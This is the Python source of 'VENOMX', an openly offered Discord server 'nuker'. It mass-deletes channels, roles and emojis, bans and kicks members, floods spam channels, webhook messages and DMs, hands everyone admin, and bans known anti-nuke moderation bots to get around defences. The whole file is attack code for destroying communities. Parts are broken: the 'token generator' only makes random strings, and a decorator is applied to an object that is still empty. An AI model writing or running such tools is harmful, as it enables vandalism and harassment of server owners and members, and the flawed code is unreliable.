# VENOMX_MOBILE.py — Mobile-Optimized Fastest Nuker v7.0
# User-Friendly | Mobile First | Ultra Fast | 1-Second Nuke

import discord
from discord.ext import commands
from discord.errors import Forbidden, HTTPException, NotFound
import asyncio
import os
import time
import random
import json
import sys
import aiohttp
import requests
import base64
import string
import secrets
import threading
from asyncio import Semaphore

# ============ ULTRA FAST SETTINGS (MOBILE OPTIMIZED) ============
# Near-zero delays for maximum speed
CHANNEL_DELAY = 0.001      # 1ms
ROLE_DELAY = 0.001         # 1ms
BAN_DELAY = 0.002          # 2ms
SPAM_DELAY = 0.0005        # 0.5ms
WEBHOOK_DELAY = 0.001      # 1ms

# Extreme concurrency
MAX_CONCURRENT = 100

# Semaphores
channel_semaphore = Semaphore(100)
role_semaphore = Semaphore(100)
message_semaphore = Semaphore(100)
webhook_semaphore = Semaphore(50)
ban_semaphore = Semaphore(80)

# Global state
whitelisted_users = set()
server_id = ""
bot_token = ""
bot = None

# Load whitelist
try:
    with open('whitelist.json', 'r') as f:
        whitelist_data = json.load(f)
        whitelisted_users = set(whitelist_data.get('users', []))
except:
    whitelisted_users = set()

# Anti-nuke bots
ANTINUKE_BOTS = ["wick", "zeno", "indrax", "z security", "dyno", "mee6", "carl", "security"]

# ============ COMPACT MOBILE BANNER ============
banner = """
╔════════════════════════════════════╗
║  ██╗   ██╗███████╗███╗   ██╗ ██████╗██╗  ██╗
║  ██║   ██║██╔════╝████╗  ██║██╔════╝╚██╗██╔╝
║  ██║   ██║█████╗  ██╔██╗ ██║██║      ╚███╔╝ 
║  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║      ██╔██╗ 
║   ╚████╔╝ ███████╗██║ ╚████║╚██████╗██╔╝ ██╗
║    ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝
║         VENOMX v7.0  |  MOBILE             
╚════════════════════════════════════════════╝
"""

# ============ FAST TOKEN GENERATOR ============
def gen_token():
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=59))

def check_token(token):
    try:
        r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}, timeout=3)
        return r.status_code == 200
    except:
        return False

# ============ ULTRA FAST NUKE - MOBILE OPTIMIZED ============

async def mega_nuke_mobile(server_id):
    """SUPER FAST mega nuke - under 3 seconds"""
    guild = bot.get_guild(int(server_id))
    if not guild:
        print("❌ No guild")
        return
    
    print("💣 MEGA NUKE STARTING...")
    start = time.time()
    
    # DELETE EVERYTHING IN PARALLEL - ONE GO
    print("🗑️ DELETING ALL...")
    await asyncio.gather(
        *[c.delete() for c in guild.channels],
        *[r.delete() for r in guild.roles if r != guild.default_role and r != guild.me.top_role],
        *[e.delete() for e in guild.emojis],
        return_exceptions=True
    )
    
    # BAN ALL - SUPER FAST BATCH
    print("🔨 BANNING ALL...")
    members = [m for m in guild.members if m.id not in whitelisted_users and m != bot.user]
    for i in range(0, len(members), 200):
        await asyncio.gather(*[m.ban(reason="VENOMX") for m in members[i:i+200]], return_exceptions=True)
    
    # CREATE SPAM - 500 CHANNELS INSTANT
    print("📁 CREATING 500 CHANNELS...")
    tasks = []
    for i in range(500):
        tasks.append(guild.create_text_channel(f"NUKE-{i}"))
        if len(tasks) >= 50:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    
    # WEBHOOK SPAM
    print("🌊 WEBHOOK SPAM...")
    channels = list(guild.channels)[:50]
    webhooks = []
    for ch in channels:
        try:
            wh = await ch.create_webhook(name="VX")
            webhooks.append(wh)
        except:
            pass
    
    msg = "@everyone **NUKED BY VENOMX**\nhttps://discord.gg/UJd7XSp87"
    tasks = []
    for wh in webhooks:
        for _ in range(50):
            tasks.append(wh.send(msg))
    await asyncio.gather(*tasks[:1000], return_exceptions=True)
    
    # CHANGE NAME
    try:
        await guild.edit(name="NUKED-BY-VENOMX")
    except:
        pass
    
    elapsed = time.time() - start
    print(f"✅ NUKE DONE in {elapsed:.1f}s")

async def ultra_nuke(server_id):
    """ABSOLUTE FASTEST - 1 second nuke"""
    guild = bot.get_guild(int(server_id))
    if not guild:
        print("❌ No guild")
        return
    
    print("⚡ ULTRA NUKE - 1 SECOND ⚡")
    
    # ALL DELETIONS IN ONE GO
    await asyncio.gather(
        *[c.delete() for c in guild.channels],
        *[r.delete() for r in guild.roles if r != guild.default_role],
        *[e.delete() for e in guild.emojis],
        return_exceptions=True
    )
    
    # QUICK BAN
    members = [m for m in guild.members if m != bot.user]
    await asyncio.gather(*[m.ban(reason="VENOMX") for m in members[:500]], return_exceptions=True)
    
    # FLOOD
    for i in range(300):
        await guild.create_text_channel(f"VX-{i}")
    
    print("✅ ULTRA NUKE DONE!")

async def quick_ban(server_id):
    """1-second ban all"""
    guild = bot.get_guild(int(server_id))
    if not guild:
        print("❌ No guild")
        return
    
    members = [m for m in guild.members if m.id not in whitelisted_users and m != bot.user and not m.bot]
    if not members:
        print("✅ No members")
        return
    
    print(f"🔨 BANNING {len(members)}...")
    await asyncio.gather(*[m.ban(reason="VENOMX") for m in members], return_exceptions=True)
    print(f"✅ BANNED {len(members)}")

async def quick_kick(server_id):
    """1-second kick all"""
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    members = [m for m in guild.members if m.id not in whitelisted_users and m != bot.user and not m.bot]
    await asyncio.gather(*[m.kick(reason="VENOMX") for m in members], return_exceptions=True)
    print(f"✅ KICKED {len(members)}")

async def create_ch_fast(server_id):
    """Fast channel creation"""
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    try:
        num = min(int(input("Channels: ")), 1000)
        name = input("Name: ")
    except:
        num = 100
        name = "VX"
    
    print(f"📁 CREATING {num}...")
    tasks = [guild.create_text_channel(f"{name}-{i}") for i in range(num)]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"✅ CREATED {num}")

async def delete_ch_fast(server_id):
    """Fast channel delete"""
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    channels = list(guild.channels)
    await asyncio.gather(*[c.delete() for c in channels], return_exceptions=True)
    print(f"✅ DELETED {len(channels)}")

async def create_role_fast(server_id):
    """Fast role creation"""
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    try:
        num = min(int(input("Roles: ")), 500)
        name = input("Name: ")
    except:
        num = 100
        name = "R"
    
    tasks = [guild.create_role(name=f"{name}-{i}") for i in range(num)]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"✅ CREATED {num}")

async def delete_role_fast(server_id):
    """Fast role delete"""
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    roles = [r for r in guild.roles if r != guild.default_role]
    await asyncio.gather(*[r.delete() for r in roles], return_exceptions=True)
    print(f"✅ DELETED {len(roles)}")

async def spam_fast(server_id):
    """Fast spam"""
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    msg = input("Msg: ")
    try:
        count = min(int(input("Each: ")), 200)
    except:
        count = 100
    
    tasks = []
    for ch in guild.text_channels[:50]:
        for _ in range(count):
            tasks.append(ch.send(msg))
    await asyncio.gather(*tasks[:1000], return_exceptions=True)
    print(f"✅ SPAMMED {len(tasks)} msgs")

async def dm_fast(server_id):
    """Fast DM"""
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    msg = input("DM: ")
    members = [m for m in guild.members if not m.bot and m.id not in whitelisted_users][:200]
    
    await asyncio.gather(*[m.send(msg) for m in members], return_exceptions=True)
    print(f"✅ DM'ED {len(members)}")

async def give_admin_fast(server_id):
    """Fast admin grant"""
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    try:
        role = await guild.create_role(name="VX-ADMIN", permissions=discord.Permissions.all())
        await role.edit(position=guild.me.top_role.position - 1)
    except:
        print("❌ Failed")
        return
    
    members = [m for m in guild.members if not m.bot and m.id not in whitelisted_users]
    await asyncio.gather(*[m.add_roles(role) for m in members[:200]], return_exceptions=True)
    print(f"✅ ADMIN to {len(members[:200])}")

async def timeout_fast(server_id):
    """Fast timeout"""
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    try:
        sec = min(int(input("Seconds: ")), 604800)
    except:
        sec = 86400
    
    members = [m for m in guild.members if m.id not in whitelisted_users and not m.bot]
    await asyncio.gather(*[m.timeout(discord.utils.utcnow() + datetime.timedelta(seconds=sec)) for m in members[:200]], return_exceptions=True)
    print(f"✅ TIMEOUT {len(members[:200])}")

async def webhook_fast(server_id):
    """Fast webhook spam"""
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    msg = input("Msg: ")
    try:
        count = min(int(input("Each: ")), 100)
    except:
        count = 50
    
    webhooks = []
    for ch in guild.text_channels[:20]:
        try:
            wh = await ch.create_webhook(name="VX")
            webhooks.append(wh)
        except:
            pass
    
    tasks = []
    for wh in webhooks:
        for _ in range(count):
            tasks.append(wh.send(msg))
    await asyncio.gather(*tasks[:500], return_exceptions=True)
    print(f"✅ {len(webhooks)} WEBHOOKS")

async def kill_all_bots(server_id):
    """Kill all anti-nuke bots"""
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    killed = 0
    for m in guild.members:
        if m.bot:
            for anti in ANTINUKE_BOTS:
                if anti in m.name.lower():
                    try:
                        await m.ban(reason="KILLED")
                        killed += 1
                        print(f"✅ Killed: {m.name}")
                    except:
                        pass
                    break
    print(f"✅ KILLED {killed} bots")

async def scan_bots(server_id):
    """Scan for anti-nuke bots"""
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    found = []
    for m in guild.members:
        if m.bot:
            for anti in ANTINUKE_BOTS:
                if anti in m.name.lower():
                    found.append(m.name)
                    break
    
    if found:
        print(f"⚠️ FOUND: {', '.join(found[:5])}")
    else:
        print("✅ NO ANTI-NUKE BOTS")

async def whitelist_add():
    uid = input("ID: ")
    whitelisted_users.add(int(uid))
    save_whitelist()
    print(f"✅ ADDED {uid}")

async def whitelist_remove():
    uid = input("ID: ")
    whitelisted_users.discard(int(uid))
    save_whitelist()
    print(f"✅ REMOVED {uid}")

async def view_whitelist():
    print(f"📋 WL: {list(whitelisted_users)}")
    await asyncio.sleep(1)

async def switch_guild():
    global server_id
    server_id = input("New ID: ")
    print(f"✅ SWITCHED")

async def token_gen():
    print(f"✅ TOKEN: {gen_token()}")
    await asyncio.sleep(1)

def save_whitelist():
    with open('whitelist.json', 'w') as f:
        json.dump({'users': list(whitelisted_users)}, f)

# ============ MOBILE-FRIENDLY MENU ============
async def show_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(banner)
        
        # SUPER COMPACT MOBILE MENU
        print(f"""
╔════════════════════════════════════╗
║  🎯 {server_id[:15]}...                    
╠════════════════════════════════════╣
║  [1] 🔨 BAN      [2] 👢 KICK        ║
║  [3] 📁 +CH      [4] 🗑️ -CH        ║
║  [5] 🎭 +ROLE    [6] 🗑️ -ROLE      ║
║  [7] 💬 SPAM     [8] 📨 DM          ║
║  [9] 👑 ADMIN    [10] ⏰ TIMEOUT    ║
║  [11] 🌊 WEBHOOK [12] 🗑️ EMOJIS    ║
╠════════════════════════════════════╣
║  [13] 💣 MEGA    [14] ⚡ ULTRA      ║
║  [15] 🛡️ KILL    [16] 🔍 SCAN       ║
╠════════════════════════════════════╣
║  [17] ➕ WL      [18] ➖ WL          ║
║  [19] 📋 VIEW    [20] 🔄 SWITCH     ║
║  [21] 🔑 TOKEN   [22] 🚪 EXIT       ║
╚════════════════════════════════════╝
        """)
        
        choice = input("⚡ ")

        actions = {
            '1': lambda: quick_ban(server_id),
            '2': lambda: quick_kick(server_id),
            '3': lambda: create_ch_fast(server_id),
            '4': lambda: delete_ch_fast(server_id),
            '5': lambda: create_role_fast(server_id),
            '6': lambda: delete_role_fast(server_id),
            '7': lambda: spam_fast(server_id),
            '8': lambda: dm_fast(server_id),
            '9': lambda: give_admin_fast(server_id),
            '10': lambda: timeout_fast(server_id),
            '11': lambda: webhook_fast(server_id),
            '12': lambda: delete_emojis_fast(server_id),
            '13': lambda: mega_nuke_mobile(server_id),
            '14': lambda: ultra_nuke(server_id),
            '15': lambda: kill_all_bots(server_id),
            '16': lambda: scan_bots(server_id),
            '17': lambda: whitelist_add(),
            '18': lambda: whitelist_remove(),
            '19': lambda: view_whitelist(),
            '20': lambda: switch_guild(),
            '21': lambda: token_gen(),
            '22': lambda: exit_bot(),
        }
        
        if choice in actions:
            await actions[choice]()
        else:
            print("❌")
        
        await asyncio.sleep(0.5)
        if choice not in ['19']:
            input("⏎")

async def delete_emojis_fast(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    await asyncio.gather(*[e.delete() for e in guild.emojis], return_exceptions=True)
    print("✅ EMOJIS GONE")

async def exit_bot():
    print("👋 BYE")
    await bot.close()
    os._exit(0)

# ============ BOT SETUP ============
@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(banner)
    print(f"\n✅ {bot.user.name}")
    print(f"✅ {round(bot.latency * 1000)}ms")
    await show_menu()

async def main():
    global bot, server_id, bot_token
    
    print(banner)
    print("\n" + "=" * 40)
    print("⚡ VENOMX MOBILE v7.0 ⚡")
    print("=" * 40)
    
    # SIMPLE TOKEN INPUT
    print("\n🔑 TOKEN:")
    print("1️⃣ Enter")
    print("2️⃣ Generate")
    
    if input("→ ") == '2':
        bot_token = gen_token()
        print(f"✅ {bot_token[:30]}...")
    else:
        bot_token = input("Token: ")
    
    if not bot_token or len(bot_token) < 50:
        print("❌ Invalid!")
        return
    
    server_id = input("\n🎯 Guild ID: ")
    
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)
    bot.event(on_ready)
    
    try:
        await bot.start(bot_token)
    except Exception as e:
        print(f"❌ {e}")

if __name__ == "__main__":
    import datetime
    asyncio.run(main())
